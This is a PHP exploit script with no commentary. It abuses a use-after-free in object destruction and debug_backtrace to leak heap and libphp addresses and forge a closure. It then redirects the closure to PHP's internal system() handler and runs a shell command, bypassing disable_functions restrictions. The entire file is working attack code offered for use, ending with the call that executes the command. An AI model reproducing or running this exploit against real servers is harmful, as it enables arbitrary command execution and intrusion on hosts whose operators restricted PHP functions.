//<?php

pwn("ls");

function hex($val)
{
	return "0x".dechex($val)."<br>";
}

function pwn($cmd) {
	global $abc, $helper, $backtrace, $backtrace2;

	class Vuln {
		public $a;
		public function __destruct() {
			global $backtrace;
			unset($this->a);
			$backtrace = (new Exception)->getTrace(); # ;)
			if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
				$backtrace = debug_backtrace();
			}
		}
	}

	class Helper {
		public $a, $b, $c, $d;
	}

	function allocate(&$a, $depth)
	{
		if ($depth === 0) return;
		$a[] = str_shuffle(str_repeat('A', 0x180-0x18-1));
		$a[] = str_shuffle(str_repeat('A', 0x180-0x18-1));
		$a[] = str_shuffle(str_repeat('A', 0x180-0x18-1));
		$a[] = str_shuffle(str_repeat('A', 0x180-0x18-1));
		$a[] = str_shuffle(str_repeat('A', 0x180-0x18-1));
		$a[] = str_shuffle(str_repeat('A', 0x180-0x18-1));
		$a[] = str_shuffle(str_repeat('A', 0x180-0x18-1));
		$a[] = str_shuffle(str_repeat('A', 0x180-0x18-1));
		$a[] = str_shuffle(str_repeat('A', 0x180-0x18-1));
		$a[] = str_shuffle(str_repeat('A', 0x180-0x18-1));
		allocate($a, $depth - 1);
	}

	function str2ptr(&$str, $p = 0) {
		$address = 0;
		$address |= ord($str[$p+7]);
		$address <<= 8;
		$address |= ord($str[$p+6]);
		$address <<= 8;
		$address |= ord($str[$p+5]);
		$address <<= 8;
		$address |= ord($str[$p+4]);
		$address <<= 8;
		$address |= ord($str[$p+3]);
		$address <<= 8;
		$address |= ord($str[$p+2]);
		$address <<= 8;
		$address |= ord($str[$p+1]);
		$address <<= 8;
		$address |= ord($str[$p+0]);
		return $address;
	}

	function write(&$str, $p, $v)
	{
		$str[$p+0] = chr($v & 0xff);
		$v >>= 8;
		$str[$p+1] = chr($v & 0xff);
		$v >>= 8;
		$str[$p+2] = chr($v & 0xff);
		$v >>= 8;
		$str[$p+3] = chr($v & 0xff);
		$v >>= 8;
		$str[$p+4] = chr($v & 0xff);
		$v >>= 8;
		$str[$p+5] = chr($v & 0xff);
		$v >>= 8;
		$str[$p+6] = chr($v & 0xff);
		$v >>= 8;
		$str[$p+7] = chr($v & 0xff);
	}

	function memRead($addr)
	{
		global $abc, $helper;
		write($abc, 0xa8, $addr - 0x10);
		return strlen($helper->a);
	}

	function trigger_uaf($arg) {
		# str_shuffle prevents opcache string interning
		$arg = str_shuffle(str_repeat('A', 79));
		$vuln = new Vuln();
		$vuln->a = $arg;
	}
	$contiguous = [];
	allocate($contiguous, 0);

	trigger_uaf('x');
	$abc = $backtrace[1]['args'][0];

	$helper = new Helper;
	$helper->a = $helper;
	$helper->b = function($x) {};
	$helper->c = 0x1337;

	if (strlen($abc) == 79 /*|| strlen($abc) == 0*/)
	{
		die("UAF failed");
	}

	# leaks
	$closure_handlers = str2ptr($abc, 0);
	$php_heap = str2ptr($abc, 0x10);
	$helper->a = "helper"; // otherwise a strage crash
	$abc_addr = $php_heap + 0x18;
	$libphp_addr = str2ptr($abc, 0) - 0xd73ec0;
	$zif_system = $libphp_addr + 0x355a86;
	$helper->b = function($x){};
	$closure_obj = str2ptr($abc, 0x20);
	echo ("abc_addr = ".hex($abc_addr));
	echo ("libphp_addr = ".hex($libphp_addr));
	echo ("zif_system = ".hex($zif_system));
	echo ("closure_obj = ".hex($closure_obj));
	echo ("<br>");

	// fake value
	write($abc, 0x10, $closure_obj);
	write($abc, 0x18, 0x6);

	function copyFunc($off)
	{
		global $helper;
		global $abc;
		if ($off > 0x110) return;
		write($abc, 0xd0 + 0x18 + $off, str2ptr($helper->a, $off));
		write($abc, 0xd0 + 0x20 + $off, str2ptr($helper->a, $off+8));
		write($abc, 0xd0 + 0x28 + $off, str2ptr($helper->a, $off+0x10));
		write($abc, 0xd0 + 0x30 + $off, str2ptr($helper->a, $off+0x18));
		write($abc, 0xd0 + 0x38 + $off, str2ptr($helper->a, $off+0x20));
		write($abc, 0xd0 + 0x40 + $off, str2ptr($helper->a, $off+0x28));
		write($abc, 0xd0 + 0x48 + $off, str2ptr($helper->a, $off+0x30));
		write($abc, 0xd0 + 0x50 + $off, str2ptr($helper->a, $off+0x38));
		write($abc, 0xd0 + 0x58 + $off, str2ptr($helper->a, $off+0x40));
		write($abc, 0xd0 + 0x60 + $off, str2ptr($helper->a, $off+0x48));
		write($abc, 0xd0 + 0x68 + $off, str2ptr($helper->a, $off+0x50));
		write($abc, 0xd0 + 0x70 + $off, str2ptr($helper->a, $off+0x58));
		write($abc, 0xd0 + 0x78 + $off, str2ptr($helper->a, $off+0x60));
		write($abc, 0xd0 + 0x80 + $off, str2ptr($helper->a, $off+0x68));
		write($abc, 0xd0 + 0x88 + $off, str2ptr($helper->a, $off+0x70));
		write($abc, 0xd0 + 0x90 + $off, str2ptr($helper->a, $off+0x78));
		write($abc, 0xd0 + 0x98 + $off, str2ptr($helper->a, $off+0x80));
		write($abc, 0xd0 + 0xa0 + $off, str2ptr($helper->a, $off+0x88));
		copyFunc($off + 0x90);
	}

	write($abc, 0xd0, 0x0000031800000002);
	write($abc, 0xd0 + 8, 0x0000000000000003);
	copyFunc(0);

	write($abc, 0xd0 + 0x38, 0x0210000000000001);
	write($abc, 0xd0 + 0x68, $zif_system);
	write($abc, 0x20, $abc_addr + 0xd0);

	($helper->b)($cmd);
	die("end");

}